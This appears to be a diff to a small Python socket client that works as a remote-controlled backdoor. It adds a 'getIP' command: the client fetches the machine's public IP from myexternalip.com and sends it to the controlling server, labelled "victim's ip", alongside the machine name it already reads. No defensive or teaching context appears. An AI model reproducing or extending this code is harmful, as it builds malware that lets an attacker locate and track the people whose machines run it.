@@ -2,6 +2,7 @@ import socket
 import threading
 import pickle
 import os
+import requests
 
 state = {}
 pcname = os.getenv('COMPUTERNAME')
@@ -9,11 +10,12 @@ pcname = os.getenv('COMPUTERNAME')
 def serverListen(serverSocket):
     while True:
         msg = serverSocket.recv(1024).decode("utf-8")
-        if msg == "./ip":
-            ip ="ip shjdojandijasnf"
-            print(ip)
-
-
+        if msg == "getIP":
+            url = 'http://myexternalip.com/raw'
+            r = requests.get(url)
+            ip = r.text
+            serverSocket.send(b"/messageSend")
+            serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))
         else:
             print(msg)
 
